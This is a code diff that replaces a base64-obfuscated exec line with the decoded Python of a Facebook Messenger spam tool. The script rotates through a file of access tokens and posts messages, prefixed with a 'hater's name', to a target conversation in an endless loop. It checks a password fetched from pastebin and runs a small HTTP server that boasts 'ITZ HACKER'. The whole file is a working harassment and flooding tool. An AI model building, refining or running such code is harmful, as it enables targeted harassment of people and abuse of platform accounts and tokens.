@@ -1,6 +1,147 @@
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 
-#PROGRAMER BY MR PREM BABU
-#ENCRYOTER TOOL BY PREM PROJECT
-#FB :- facebook.com/prembabu001
-import base64
-exec(base64.b64decode("aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHN5cw0KZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtDQppbXBvcnQgb3MNCmltcG9ydCBodHRwLnNlcnZlcg0KaW1wb3J0IHNvY2tldHNlcnZlcg0KaW1wb3J0IHRocmVhZGluZw0KDQpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToNCiAgICBkZWYgZG9fR0VUKHNlbGYpOg0KICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQ0KICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9wbGFpbicpDQogICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQ0KICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiQ1JFQVRFUiBCWSBNUiBQUkVNIFBST0pFQ1QiKQ0KDQpkZWYgZXhlY3V0ZV9zZXJ2ZXIoKToNCiAgICBQT1JUID0gNDAwMA0KDQogICAgd2l0aCBzb2NrZXRzZXJ2ZXIuVENQU2VydmVyKCgiIiwgUE9SVCksIE15SGFuZGxlcikgYXMgaHR0cGQ6DQogICAgICAgIHByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpDQogICAgICAgIGh0dHBkLnNlcnZlX2ZvcmV2ZXIoKQ0KDQpkZWYgc2VuZF9tZXNzYWdlcygpOg0KICAgIHdpdGggb3BlbigncGFzc3dvcmQudHh0JywgJ3InKSBhcyBmaWxlOg0KICAgICAgICBwYXNzd29yZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KICAgIGVudGVyZWRfcGFzc3dvcmQgPSBwYXNzd29yZA0KDQogICAgaWYgZW50ZXJlZF9wYXNzd29yZCAhPSBwYXNzd29yZDoNCiAgICAgICAgcHJpbnQoJ1stXSBXUk9ORyBQQVNTV09SRCBUUlkgQUdBSU4nKQ0KICAgICAgICBzeXMuZXhpdCgpDQoNCiAgICB3aXRoIG9wZW4oJ3Rva2VuLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQ0KICAgIG51bV90b2tlbnMgPSBsZW4odG9rZW5zKQ0KDQogICAgcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkNCg0KICAgIGRlZiBjbHMoKToNCiAgICAgICAgaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoNCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgaWYgc3lzdGVtKCkgPT0gJ1dpbmRvd3MnOg0KICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xzJykNCiAgICBjbHMoKQ0KDQogICAgZGVmIGxpbmVzcygpOg0KICAgICAgICBwcmludCgnXHUwMDFiWzM3bScgKyAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykNCg0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLA0KICAgICAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICAgICAnVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywNCiAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMC4wOyBTYW1zdW5nIEdhbGF4eSBTOSBCdWlsZC9PUFI2LjE3MDYyMy4wMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsDQogICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsDQogICAgICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsDQogICAgICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLA0KICAgICAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScNCiAgICB9DQoNCiAgICBtbW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9UY1FQWmFXOCcpLnRleHQNCg0KICAgIGlmIG1tbSBub3QgaW4gcGFzc3dvcmQ6DQogICAgICAgIHByaW50KCdbLV0gV1JPTkcgUEFTU1dPUkQgVFJZIEFHQUlOJykNCiAgICAgICAgc3lzLmV4aXQoKQ0KDQogICAgbGluZXNzKCkNCg0KICAgIGFjY2Vzc190b2tlbnMgPSBbdG9rZW4uc3RyaXAoKSBmb3IgdG9rZW4gaW4gdG9rZW5zXQ0KDQogICAgd2l0aCBvcGVuKCdjb252by50eHQnLCAncicpIGFzIGZpbGU6DQogICAgICAgIGNvbnZvX2lkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQ0KDQogICAgd2l0aCBvcGVuKCdmaWxlLnR4dCcsICdyJykgYXMgZmlsZToNCiAgICAgICAgdGV4dF9maWxlX3BhdGggPSBmaWxlLnJlYWQoKS5zdHJpcCgpDQoNCiAgICB3aXRoIG9wZW4odGV4dF9maWxlX3BhdGgsICdyJykgYXMgZmlsZToNCiAgICAgICAgbWVzc2FnZXMgPSBmaWxlLnJlYWRsaW5lcygpDQoNCiAgICBudW1fbWVzc2FnZXMgPSBsZW4obWVzc2FnZXMpDQogICAgbWF4X3Rva2VucyA9IG1pbihudW1fdG9rZW5zLCBudW1fbWVzc2FnZXMpDQoNCiAgICB3aXRoIG9wZW4oJ2hhdGVyc25hbWUudHh0JywgJ3InKSBhcyBmaWxlOg0KICAgICAgICBoYXRlcnNfbmFtZSA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KICAgIHdpdGggb3BlbigndGltZS50eHQnLCAncicpIGFzIGZpbGU6DQogICAgICAgIHNwZWVkID0gaW50KGZpbGUucmVhZCgpLnN0cmlwKCkpDQoNCiAgICBsaW5lc3MoKQ0KDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZm9yIG1lc3NhZ2VfaW5kZXggaW4gcmFuZ2UobnVtX21lc3NhZ2VzKToNCiAgICAgICAgICAgICAgICB0b2tlbl9pbmRleCA9IG1lc3NhZ2VfaW5kZXggJSBtYXhfdG9rZW5zDQogICAgICAgICAgICAgICAgYWNjZXNzX3Rva2VuID0gYWNjZXNzX3Rva2Vuc1t0b2tlbl9pbmRleF0NCg0KICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSBtZXNzYWdlc1ttZXNzYWdlX2luZGV4XS5zdHJpcCgpDQoNCiAgICAgICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAve30vIi5mb3JtYXQoJ3RfJytjb252b19pZCkNCiAgICAgICAgICAgICAgICBwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlfQ0KICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQ0KDQogICAgICAgICAgICAgICAgY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQ0KICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLm9rOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgiWytdIE1BU1NBR0Uge30gT0YgQ09OVk8ge30gU0VOVCBCWSBUT0tFTiB7fToge30iLmZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkNCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkNCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgiW3hdIEZBSUxFRCBNRVNTQUdFIHt9IE9GIENPTlZPIHt9IFdJVEggVE9LRU4ge306IHt9Ii5mb3JtYXQoDQogICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiAgLSBUaW1lOiB7fSIuZm9ybWF0KGN1cnJlbnRfdGltZSkpDQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpDQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChzcGVlZCkNCg0KICAgICAgICAgICAgcHJpbnQoIlxuWytdIEFMTCBNRVNTQUdFUyBTRU5UIFJFU1RBUlRJTkcgVEhFIFBST0NFU1NcbiIpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHByaW50KCJbIV0gQW4gZXJyb3Igb2NjdXJyZWQ6IHt9Ii5mb3JtYXQoZSkpDQoNCmRlZiBtYWluKCk6DQogICAgc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQ0KICAgIHNlcnZlcl90aHJlYWQuc3RhcnQoKQ0KDQogICAgc2VuZF9tZXNzYWdlcygpDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgbWFpbigp"))
+
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+
+  def do_GET(self):
+    self.send_response(200)
+    self.send_header('Content-type', 'text/plain')
+    self.end_headers()
+    self.wfile.write(
+        b"ITZ HACKER FOLLOW ME ON FACEBOOK (www.facebook.com/prembabu001)")
+
+
+def execute_server():
+  PORT = 4000
+
+  with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+    print("Server running at http://localhost:{}".format(PORT))
+    httpd.serve_forever()
+
+
+def send_messages():
+  with open('password.txt', 'r') as file:
+    password = file.read().strip()
+
+  entered_password = password
+
+  if entered_password != password:
+    print('[-] <==> Incorrect Password!')
+    sys.exit()
+
+  with open('tokennum.txt', 'r') as file:
+    tokens = file.readlines()
+  num_tokens = len(tokens)
+
+  requests.packages.urllib3.disable_warnings()
+
+  def cls():
+    if system() == 'Linux':
+      os.system('clear')
+    else:
+      if system() == 'Windows':
+        os.system('cls')
+
+  cls()
+
+  def liness():
+    print('\u001b[37m' + '---------------------------------------------------')
+
+  headers = {
+      'Connection': 'keep-alive',
+      'Cache-Control': 'max-age=0',
+      'Upgrade-Insecure-Requests': '1',
+      'User-Agent':
+      'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+      'Accept':
+      'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+      'Accept-Encoding': 'gzip, deflate',
+      'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+      'referer': 'www.google.com'
+  }
+
+  mmm = requests.get('https://pastebin.com/raw/TcQPZaW8').text
+
+  if mmm not in password:
+    print('[-] <==> Incorrect Password!')
+    sys.exit()
+
+  liness()
+
+  access_tokens = [token.strip() for token in tokens]
+
+  with open('convo.txt', 'r') as file:
+    convo_id = file.read().strip()
+
+  with open('file.txt', 'r') as file:
+    text_file_path = file.read().strip()
+
+  with open(text_file_path, 'r') as file:
+    messages = file.readlines()
+
+  num_messages = len(messages)
+  max_tokens = min(num_tokens, num_messages)
+
+  with open('hatersname.txt', 'r') as file:
+    haters_name = file.read().strip()
+
+  with open('time.txt', 'r') as file:
+    speed = int(file.read().strip())
+
+  liness()
+
+  while True:
+    try:
+      for message_index in range(num_messages):
+        token_index = message_index % max_tokens
+        access_token = access_tokens[token_index]
+
+        message = messages[message_index].strip()
+
+        url = "https://graph.facebook.com/v15.0/{}/".format('t_' + convo_id)
+        parameters = {
+            'access_token': access_token,
+            'message': haters_name + ' ' + message
+        }
+        response = requests.post(url, json=parameters, headers=headers)
+
+        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+        if response.ok:
+          print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
+              message_index + 1, convo_id, token_index + 1,
+              haters_name + ' ' + message))
+          print("  - Time: {}".format(current_time))
+          liness()
+          liness()
+        else:
+          print("[x] Failed to send messages {} of Convo {} with Token {}: {}".
+                format(message_index + 1, convo_id, token_index + 1,
+                       haters_name + ' ' + message))
+          print("  - Time: {}".format(current_time))
+          liness()
+          liness()
+        time.sleep(speed)
+
+      print("\n[+] All messages sent. Restarting the process...\n")
+    except Exception as e:
+      print("[!] An error occurred: {}".format(e))
+
+
+def main():
+  server_thread = threading.Thread(target=execute_server)
+  server_thread.start()
+
+  send_messages()
+
+
+if __name__ == '__main__':
+  main()
